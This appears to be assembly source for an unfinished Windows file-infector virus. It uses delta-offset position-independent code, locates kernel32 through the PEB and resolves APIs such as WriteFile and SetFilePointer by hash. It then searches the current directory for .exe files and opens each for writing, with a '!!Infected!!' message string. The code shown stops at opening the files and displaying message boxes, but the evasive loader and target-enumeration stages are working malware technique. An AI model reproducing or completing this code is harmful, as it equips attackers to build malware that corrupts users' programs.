    .386
    .MODEL Flat, STDCALL
    option casemap:none             ; Treat labels as case-sensitive

.CODE
start:
incode segment
_start:
        call    delta
	delta:
            pop     ebp
            sub     ebp, offset delta
        
        call    find_kernel32 ;output in eax
        mov     ebx, eax
        lea     edx, [ebp + offset hash_GetProcAddress]
        mov     ecx, 0dh
        find_funcs:
            push    [edx] ;push func_hash
            push    ebx ;push pointer kernel32_addr
            call    find_func ;output in eax
            mov     [edx - 04h], eax
            
            add     edx, 08h ;next func
            dec     ecx ;decrease countdown
            cmp     ecx, 00
            jnz     find_funcs ;ecx=0
        call    load_MessageBoxA
        _find_first:
            lea     ebx, [ebp + offset file_data]
            lea     edx, [ebp + offset str_exe]
            push    ebx
            push    edx
            call    [ebp + offset func_FindFirstFileA] ;param LPCSTR file_name, LPWIN32_FIND_DATAA file_data, return HANDLE handle_search in eax
            cmp     eax, -1
            jz      malware_done
            mov     [ebp + offset search_handle], eax
            ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                call view_infor
            ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;           
            _find_next:
                lea     ebx, [ebp + offset file_data]
                mov     edx, [ebp + search_handle]
                push    ebx
                push    edx
                call    [ebp + func_FindNextFileA] ;params: HANDLE handle_search, LPWIN32_FIND_DATAA file_data, return true or false
                cmp     eax, 00h
                jz      malware_done
                
                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
                    call view_infor
                ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;           
            
                
                jmp      _find_next
            

           
           
        
        load_MessageBoxA:
            lea     eax, [ebp + offset str_User32]
            push    eax
            call    [ebp + offset func_LoadLibrary] ;output in eax
    
            lea     ebx, [ebp + offset hash_MessageBoxA]
            push    [ebx]
            push    eax
            call    find_func ;output in eax
            mov     [ebp + offset func_MessageBoxA], eax
            ret
        show_message:
            push    0
            lea     eax, [ebp + offset str_dir_path] ;str_mess_capt
            push    eax
            lea     eax, [ebp + offset str_mess_mess]
            push    eax
            push    0
            call    [ebp + offset func_MessageBoxA]
        malware_done: 
            push    0
            call    [ebp + offset func_ExitProcess]
        
;--------------------------------------------------------------------------------------------------------;        
        ;return kernel32.dll addr in eax
        find_kernel32:       
           ASSUME FS:NOTHING     
           mov eax, fs:[30h] ;PEB
	   mov eax, [eax + 0Ch] ;PEB->Ldr
	   mov eax, [eax + 14h] ;PEB->Ldr.InMemoryOrderModuleList.Flink
	   mov eax, [eax] ;next entry (2nd entry)
	   mov eax, [eax] ;next entry (3rd entry)
	   mov eax, [eax + 10h] ;3rd entry base addr (kernel32.dll)
	   ret;
      
        ;get func_hash and lib_addr in stack and return in eax
        find_func:
            pushad
            mov     ebp, [esp + 24h] ;lib address
            mov     eax, [ebp + 3ch] ;PE_header_offset
            mov     edx, [ebp + eax + 78h] ;get export_dir_RVA
            add     edx, ebp ;export_dir_VA
            mov     ecx, [edx + 18h] ;NumberOfFunctions
            mov     ebx, [edx + 20h] ;AddressOfNames
            add     ebx, ebp ; AddressOfNames_VA
            find_func_loop:
                jecxz   find_func_done  ; if ecx = 0, break
                dec     ecx
                mov     esi, [ebx + ecx * 4]; func_name_RVA
                add     esi, ebp ; func_name_VA
            calc_hash:
                xor     edi, edi
                xor     eax, eax
                cld     ; clear the direction flag
            calc_hash_next:
                mov     al, [esi]
                inc     esi
                test    al, al
                jz      find_func_compare
                ror     edi, 0dh
                add     edi, eax
                jmp     calc_hash_next
            find_func_compare:
                cmp     edi, [esp + 28h] ;compare hash and func_hash
                jnz     find_func_loop ;not match
                mov     ebx, [edx + 24h] ;AddressOfNameOrdinals_RVA
                add     ebx, ebp ;AddressOfNameOrdinals_VA
                mov     cx, [ebx + 2 * ecx] ;func_oridinal
                mov     ebx, [edx + 1ch] ;AddressOfNameOrdinals_RVA
                add     ebx, ebp ; AddressOfNameOrdinals_VA
                mov     eax, [ebx + 4 * ecx] ;func_RVA
                add     eax, ebp ;func_VA
                mov     [esp + 24h], eax ; Overwrite the stack copy of the preserved eax register
            find_func_done:
                mov     eax, [esp+20h]
                mov     [esp+28h], eax
                popad
                pop     eax
                pop     eax
                ret
        view_infor:
            push    0   ; NULL
            push    20h ; FILE_ATTRIBUTE_NORMAL
            push    3h  ; OPEN_EXISTING
            push    0   ; NULL
            push    1h  ; FILE_SHARE_READ
            push    0C0000000h  ; GENERIC_READ | GENERIC_WRITE
            lea     eax, [ebp + file_data + 2ch]
            push    eax ;file_name
            call    [ebp + offset func_CreateFileA] ;params: LPTSTR file_name, DWORD desire_access, DWORD share_mode, LPSECURITY_ATTRIBUTES security, DWORD creation_disposition, DWORD flags_attributes, HANDLE template_file, return file_handle
            cmp     eax, 0FFFFFFFFh
            mov     [ebp + offset file_handle], eax
            je      open_fail
            open_success:
                push    0
                lea     eax, [ebp + offset str_success] ;str_mess_capt
                push    eax
                lea     eax, [ebp + offset file_data + 2ch]
                push    eax
                push    0
                call    [ebp + offset func_MessageBoxA]
                push    [ebp + offset file_handle]
                call    [ebp + offset func_CloseHandle]
                jmp     view_done
            open_fail:
                push    0
                lea     eax, [ebp + offset str_fail] ;str_mess_capt
                push    eax
                lea     eax, [ebp + offset file_data + 2ch]
                push    eax
                push    0
                call    [ebp + offset func_MessageBoxA]
            view_done:
                ret
               

;-------------------------------------------------------------------------------;
;-------------------------------------DATA--------------------------------------;
;-------------------------------------------------------------------------------;
                
        str_mess_capt                  db "Hello",0
	str_mess_mess                  db "!!Infected!!",0
        
        addr_Kernel32 dd 0   
            func_GetProcAddress         dd      ?
            hash_GetProcAddress         dd      7c0dfcaah  
            
            func_LoadLibrary            dd      ?
            hash_LoadLibrary            dd      0ec0e4e8eh
            
            func_ExitProcess            dd      ?
            hash_ExitProcess            dd      73e2d87eh
            
            func_CloseHandle            dd      ?
            hash_CloseHandle            dd      0ffd97fbh
            
            func_CreateFileA            dd      ?
            hash_CreateFileA            dd      7c0017a5h
            
            func_FindClose              dd      ?
            hash_FindClose              dd      23545978h
            
            func_FindFirstFileA         dd      ?
            hash_FindFirstFileA         dd      63d6c065h
            
            func_FindNextFileA          dd      ?
            hash_FindNextFileA          dd      0a5e1ac97h
            
            func_GetCurrentDirectoryA   dd      ?
            hash_GetCurrentDirectoryA   dd      0bfc6eb4fh
            
            func_ReadFile               dd      ?
            hash_ReadFile               dd      10fa6516h
            
            func_SetFilePointer         dd      ?
            hash_SetFilePointer         dd      76da08ach
            
            func_WriteFile              dd      ?
            hash_WriteFile              dd      0e80a791fh
            
            func_lstrcatA               dd      ?
            hash_lstrcatA               dd      0cb73463bh

        str_User32                      db     "user32.dll",0
            func_MessageBoxA            dd      ?
            hash_MessageBoxA            dd      0bc4da2a8h

        str_dir_path                    db      256 dup (0)
        str_exe                         db      "*.exe",0

                
        search_handle                   dd      ?
        file_handle                     dd      ?
        file_data                       db      320 dup(?)
        
        
        str_fail                        db      "Fail",0
        str_success                     db      "Success",0
_end:
incode ends
end start
